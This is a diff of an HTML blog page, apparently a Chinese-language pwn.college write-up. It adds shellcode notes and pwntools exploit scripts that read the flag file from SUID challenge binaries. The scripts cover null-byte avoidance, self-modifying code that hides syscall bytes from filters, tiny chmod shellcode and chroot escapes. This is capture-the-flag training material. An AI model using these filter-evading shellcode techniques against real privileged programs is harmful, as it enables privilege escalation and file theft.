@@ -26,7 +26,7 @@
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220117165401525.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/photo_2018-01-13_11-28-32.jpg">
 <meta property="article:published_time" content="2022-01-16T14:00:00.000Z">
-<meta property="article:modified_time" content="2022-04-02T07:39:55.195Z">
+<meta property="article:modified_time" content="2022-04-03T15:00:00.562Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary_large_image">
@@ -212,7 +212,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      33k 字
+      35k 字
     </span>
   
 
@@ -221,7 +221,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      415 分钟
+      441 分钟
     </span>
   
 
@@ -262,7 +262,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年4月2日 下午
+                  不可视境界线最后变动于：2022年4月3日 晚上
                 
               </p>
             
@@ -271,7 +271,9 @@
 <li><p>连接</p>
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ssh -i ~/pwn.college/pwnkey hacker@dojo.pwn.college <br></code></pre></div></td></tr></table></figure></li>
 <li><p>传文件到dojo或拉取</p>
-<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">scp -i ~/pwn.college/pwnkey [文件] hacker@dojo.pwn.college:<br>scp -i ~/pwn.college/pwnkey hacker@dojo.pwn.college:[文件] ./ <br></code></pre></div></td></tr></table></figure></li>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">scp -i ~/pwn.college/pwnkey [文件] hacker@dojo.pwn.college:<br>scp -i ~/pwn.college/pwnkey hacker@dojo.pwn.college:[文件] ./<br></code></pre></div></td></tr></table></figure></li>
+<li><p><strong>可以创建flag的符号链接, 不过除了$HOME其他目录均不能写, 只能在<code>~/</code>下.</strong> </p>
+</li>
 </ul>
 <h1 id="module-1"><a href="#module-1" class="headerlink" title="module 1"></a>module 1</h1><h2 id="The-file-system"><a href="#The-file-system" class="headerlink" title="The file system"></a>The file system</h2><p><img src="../../image/pwn-modules/image-20220117165401525.png" srcset="/img/loading.gif" lazyload alt="image-20220117165401525"></p>
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ln -s /old/path /new/path<br>&lt;in_file:      redirect in_file into the command&#x27;s input<br><span class="hljs-meta">&gt;</span><span class="bash">out_file:     redirect the <span class="hljs-built_in">command</span><span class="hljs-string">&#x27;s output into out_file, overwriting it</span></span><br><span class="hljs-meta">&gt;</span><span class="bash"><span class="hljs-string">&gt;out_file:    redirect the command&#x27;</span>s output into out_file, appending to it</span><br><span class="hljs-meta">2&gt;</span><span class="bash">error_file:  redirect the <span class="hljs-built_in">command</span><span class="hljs-string">&#x27;s errors into error_file, overwriting it</span></span><br><span class="hljs-meta">2&gt;</span><span class="bash"><span class="hljs-string">&gt;error_file: redirect the command&#x27;</span>s errors into error_file, appending to it</span><br></code></pre></div></td></tr></table></figure>
@@ -864,16 +866,14 @@
 
 <h1 id="module-4"><a href="#module-4" class="headerlink" title="module 4"></a>module 4</h1><p>基本全在PPT里面.</p>
 <h2 id="0-基本操作"><a href="#0-基本操作" class="headerlink" title="0.基本操作"></a>0.基本操作</h2><ul>
-<li><p>intro:</p>
-<ul>
+<li>intro:<ul>
 <li><p>Buiding shellcode: just using pwntools.</p>
 </li>
 <li><p>Debugging: strace or gdb</p>
 </li>
 </ul>
 </li>
-<li><p>common challenge:</p>
-<ul>
+<li>common challenge:<ul>
 <li><p><strong>forbidden bytes:</strong> such as <code>NULL(&#39;\0&#39;)</code>, <code>whitespace</code>,  <code>&#39;H&#39;</code> and so on.</p>
 </li>
 <li><p><strong>self-modifying codes</strong> in level 5.<br><code>gcc -Wl,-N --static -nostdlib -o test test.s</code> to make writable <code>.text</code> segment</p>
@@ -886,9 +886,11 @@
 </li>
 </ul>
 </li>
-<li><p>Remain injection points: JIT, jus-in-time, 即时.</p>
-</li>
+<li>Remain injection points: JIT, jus-in-time, 即时.</li>
 </ul>
+<p>avoid null-bytes:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">mov rdi, 0 -&gt; xor rdi, rdi<br>xor edi, edi //will clear rdi<br>mov rax, 2 -&gt; mov al , 2<br>mov rsi, 100 -&gt; xor rsi, rsi / mov si, 100<br>;set a byte(0x01) in the asm, then dec that address<br>lea rdi, [rip+0x3d] -&gt; mov byte ptr [rip+1], &#x27;/&#x27; ;and then, the whole string: &#x27;/flag&#x27;<br></code></pre></div></td></tr></table></figure>
+
 <h2 id="1-开始"><a href="#1-开始" class="headerlink" title="1.开始"></a>1.开始</h2><p>非常直接的一道题目, 不过我重新认识了一下shellcode, 原来amd64.open做的事情还包括防止指令序列中出现<code>&#39;\0&#39;</code>, 以前用的都没有细想这个问题. 不过前两题都是用的read函数直接读取stdin直到eof, 所以不需要担心空字符的问题.<del>amd64.open这个函数我都没有在文档里面查到.</del> </p>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/b*&quot;</span>)[<span class="hljs-number">1</span>] <span class="hljs-comment">#直接使用wildcard, 不过会匹配到c和binary, 选择第二个即可</span><br>context.binary = binary<br>p = process(binary) <br><br>p.recvuntil(<span class="hljs-string">&quot;stack at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br><span class="hljs-comment">#打开文件, rax存储fd, 从文件中读取到内存中addr+0x100, 然后写到stdout</span><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br>payload = asm(shellcode)<br>p.recv()<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>
 
@@ -914,7 +916,10 @@
 <h2 id="5-禁用syscall系列"><a href="#5-禁用syscall系列" class="headerlink" title="5.禁用syscall系列"></a>5.禁用syscall系列</h2><blockquote>
 <p>啊这, 我这……. 折腾了半天重新看了看课件终于知道他要考我什么了.</p>
 </blockquote>
-<p>还可以用<code>mov byte ptr [rip + s01], 0x0f</code>这样的来改变shellcode本身.</p>
+<p>还可以用<code>mov byte ptr [rip + s01], 0x0f</code>这样的来改变shellcode本身. 依据在于将0f05两个字节分开来.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">mov byte ptr [rip+syscall1], 0x0f<br>mov byte ptr [rip+syscall2], 0x05<br></code></pre></div></td></tr></table></figure>
+
+<p>exploit:</p>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary    <span class="hljs-comment"># 例行解决arch问题</span><br>p = process(binary)<br><br>p.recvuntil(<span class="hljs-string">&quot;memory at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br><span class="hljs-comment"># dec BYTE PTR [rip+1]</span><br><span class="hljs-comment"># b&#x27;\xfe\r\x01\x00\x00\x00&#x27;</span><br>payload = asm(shellcode)<br><br>i = <span class="hljs-number">0</span><br><span class="hljs-comment"># len = len(payload)</span><br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(payload):<br>    <span class="hljs-keyword">if</span> payload[i]==<span class="hljs-number">0x0f</span> <span class="hljs-keyword">and</span> payload[i+<span class="hljs-number">1</span>]==<span class="hljs-number">0x05</span>:<br>        <span class="hljs-comment"># 发现syscall的0x0f05的时候换成一条dec指令+0x0f06, 注意到opcode已经换成了0x0f06</span><br>        <span class="hljs-comment"># 即CLTS(Clear Task-Switched Flag in CR0)指令.</span><br>        <span class="hljs-comment"># 如果整个0f04不存在的指令也行, 不会引起反汇编出现SIGSEGV</span><br>        payload = payload[:i] + <span class="hljs-string">b&#x27;\xfe\r\x01\x00\x00\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x0f\x06&#x27;</span> + payload[i+<span class="hljs-number">2</span>:]<br>        i+=<span class="hljs-number">8</span><br>    <span class="hljs-keyword">else</span>:<br>        i+=<span class="hljs-number">1</span><br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>
 
 <p>6.同上, 限制前0x1000写入权限, 总共可写入0x2000</p>
@@ -947,14 +952,15 @@
 <p>不一定要用这种替换, 可以使用<code>lea rdi, [rip+0x??]</code> , 或者下面这个chown系统调用.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">lea rdi, [rip+0xf]<br>mov si, 0x3e8<br>mov dx, si<br>mov al, 92<br>syscall # chown(const char *pathname, uid_t owner, gid_t group)<br></code></pre></div></td></tr></table></figure>
 </blockquote>
-<p>13.同上, 而且变成0xc字节, 看来只能chown或者chmod了</p>
-<blockquote>
-<p>?????</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">lea rdi, [rip+0xf]<br>xor rsi, rsi<br>mov dx, si<br>mov al, 92<br>syscall # chown(const char *pathname, uid_t owner, gid_t group)<br></code></pre></div></td></tr></table></figure>
+<p>13.同上, 而且变成0xc字节, 看来只能chown或者chmod了, 这里用chmod.</p>
+<ul>
+<li><p>?????好吧应该push到栈上, 然后再mov rsp, 这样子才能大幅度地减少字节长度.</p>
+<p>而且由于是小端法存储, 自然地就有7个空字符在0x66后面.<br>gdb一看rax是put函数的返回值, 直接就是0. 这点挺重要: <strong>利用可预测的寄存器的值</strong> </p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">push byte ptr &#x27;f&#x27;    ;6a 66 <br>mov rdi, rsp		;48 89 e7<br>mov sil, 0x04		;40 b6 04<br>mov al, 0x5a		;b0 5a <br>syscall			    ;0f 05 长度为0xb  <br></code></pre></div></td></tr></table></figure>
 
-
-
+<p>第二种方案是execv, 去执行shell, 不过文件开头要这么写<code>#!/bin/sh -p</code>, -p是防止默认的重置SUID操作. shell里面直接写<code>cat /flag</code>就成了</p>
 <h2 id="9-被动修改"><a href="#9-被动修改" class="headerlink" title="9.被动修改"></a>9.被动修改</h2><blockquote>
 <p>This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an<br>instruction is an <code>INT 3</code>, which is an interrupt to call into the debugger. You must avoid these modifications in your<br>shellcode.</p>
 </blockquote>
@@ -1015,14 +1021,25 @@
 </ul>
 </li>
 </ul>
-<h2 id="WP-2"><a href="#WP-2" class="headerlink" title="WP:"></a>WP:</h2><blockquote>
+<blockquote>
 <p>Redirections很重要. <a target="_blank" rel="noopener" href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html">link</a> </p>
 </blockquote>
+<p>实际测试中在shell里面直接使用chroot命令并不会发生escape, 只能在c代码中使用chroot库函数. 猜测可能是因为chroot的命令行对系统调用进行了一层封装, 加上了跳转到jail里面的目录中; 而libc库中只是单纯的系统调用, 并没有chdir这个步骤.</p>
 <h3 id="1-exemplify"><a href="#1-exemplify" class="headerlink" title="1.exemplify"></a>1.exemplify</h3><p>相当简单, 直接利用程序中chroot后没有切换到jail里面的特点, 更改cwd为真正的根目录, 第一个参数填写为flag, 最后open的时候由于flag是相对地址, 会以真正的根目录作为基准来定位true flag.</p>
 <h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><blockquote>
 <p>第一个参数不能含有flag字符串, 是为了禁止直接打开flag文件. 在这个challenge中还可以注入shellcode, </p>
 </blockquote>
+<p>也没什么难的, 只要在shellcode里面打开‘flag’然后写到stdin里面就可以了.</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/baby*[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br>p = process([binary, <span class="hljs-string">b&#x27;abc&#x27;</span>]) <span class="hljs-comment">#不能直接打开flag文件</span><br><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;O_RDWR&#x27;</span>)<br>shellcode+= <span class="hljs-string">&#x27;lea r8, [rip]\nadd r8, 0x100&#x27;</span>	<span class="hljs-comment">#写到buf上, 估计很快就不行了.</span><br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br>payload += <span class="hljs-string">b&#x27;\x0f\x04&#x27;</span>	<span class="hljs-comment"># 随手加个非法指令,遇到SIGILL就知道shellcode肯定是执行完了.</span><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure>
 
+<h3 id="3-move-in"><a href="#3-move-in" class="headerlink" title="3.move in"></a>3.move in</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *.<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/baby*[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br><span class="hljs-comment">#p = process([binary, b&#x27;abc&#x27;])                   </span><br><br><span class="hljs-comment">#p.recvuntil(&quot;memory at 0x&quot;)</span><br><span class="hljs-comment">#addr = int(p.recvline()[:-2], 16)</span><br><br><br>shellcode = <span class="hljs-string">&#x27;lea r8, [rip]\nadd r8, 0x100&#x27;</span><br>shellcode+= shellcraft.amd64.read(<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x40</span>)<br>payload = asm(shellcode)<br>payload += <span class="hljs-string">b&#x27;\x0f\x04&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/home/hacker/bytes&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(payload)<br><span class="hljs-comment">#p.sendline(b&#x27;abcd&#x27;)</span><br><span class="hljs-comment">#p.sendline(payload)</span><br><br><span class="hljs-comment">#p.interactive()</span><br></code></pre></div></td></tr></table></figure>
+
+<h3 id="4-seccomped"><a href="#4-seccomped" class="headerlink" title="4.seccomped"></a>4.seccomped</h3><blockquote>
+<p>每一题的要求都在逐渐增加.</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br></code></pre></div></td></tr></table></figure>
+
+<h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3>
             </div>
             <hr>
             <div>
